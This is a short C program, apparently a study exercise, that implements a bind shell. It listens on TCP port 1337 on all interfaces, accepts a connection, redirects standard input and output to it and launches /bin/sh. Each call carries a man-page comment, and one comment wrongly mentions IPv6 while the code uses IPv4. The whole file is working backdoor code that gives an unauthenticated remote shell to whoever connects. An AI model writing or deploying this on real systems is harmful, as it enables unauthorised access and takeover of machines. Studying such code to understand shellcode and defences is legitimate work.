#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <stddef.h>
#include <unistd.h>

int sockfd;
int recvConn;

int main() {
  // int socket(int domain, int type, int protocol);
  // AF_INET6 sets up the socket for IPv6 usage
  // SOCK_STREAM ensures it's a bi-directional communication
  // 0 says we're using the Internet Protocol (IP)
  sockfd = socket(AF_INET, SOCK_STREAM, 0);

  struct sockaddr_in v4lhost;
  v4lhost.sin_family = AF_INET;
  // uint16_t htons(uint16_t hostshort);
  v4lhost.sin_port = htons(1337);
  v4lhost.sin_addr.s_addr = INADDR_ANY;

  // int bind(int sockfd, const struct sockaddr *addr,
  //          socklen_t addrlen);
  bind(sockfd, (struct sockaddr*) &v4lhost, sizeof(v4lhost));

  // int listen(int sockfd, int backlog)
  listen(sockfd, 0);

  // int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
  recvConn = accept(sockfd, NULL, NULL);

  // int dup2(int oldfd, int newfd);
  dup2(recvConn, 0);
  dup2(recvConn, 1);
  dup2(recvConn, 2);

  // int execve(const char *filename, char *const argv[],
  //            char *const envp[]);
  execve("/bin/sh", NULL, NULL);
  close(recvConn);

  return 0;
}
